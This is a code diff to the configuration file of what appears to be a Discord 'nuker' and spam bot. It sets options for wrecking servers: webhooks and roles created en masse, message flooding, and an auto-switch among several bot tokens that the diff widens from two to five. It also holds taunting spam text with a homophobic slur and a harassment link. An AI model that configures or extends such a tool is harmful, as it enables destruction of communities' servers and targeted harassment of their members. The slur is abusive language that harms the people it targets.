@@ -70,9 +70,9 @@ module.exports = {
             leaveServerAfterNuke: false
         },
         webhooks: {
-            createCount: 2,
+            createCount: 1,
             names: ["NUKED BY KYN", "GET WRECKED BY GOLDSOCIETY"],
-            messages: ["# NUKEDDDDDDDD JOIN https://discord.gg/zxstXnd4", "# KYN OWNS YOU"]
+            messages: ["# NUKEDDDDDDDD JOIN https://discord.gg/zxstXnd4"]
         },
         roles: {
             createCount: 10,
@@ -85,7 +85,7 @@ module.exports = {
 
     spammer: {
         // NEW: Multi-token auto-switch (uses existing token system)
-        tokens: [process.env.TOKEN_SPAMMER, process.env.TOKEN_SPAMMER_2], // Add more as backup
+        tokens: [process.env.TOKEN_SPAMMER, process.env.TOKEN_SPAMMER_2, process.env.TOKEN_SPAMMER_3, process.env.TOKEN_SPAMMER_4, process.env.TOKEN_SPAMMER_5], // Add more as backup
         authorizedIds: ['1284886248330231891', '13', '13'],
         whitelistedIds: ['1284886248330231891', '12'],
         defaultSpamMessage: "# YOU'RE BEING SPAMMED BY KYN FAGT! GET LOST BOZO! https://cdn.discordapp.com/attachments/1243645226091020328/1320136219585155114/d68845f804446649d52eb4085678eb3c.gif",
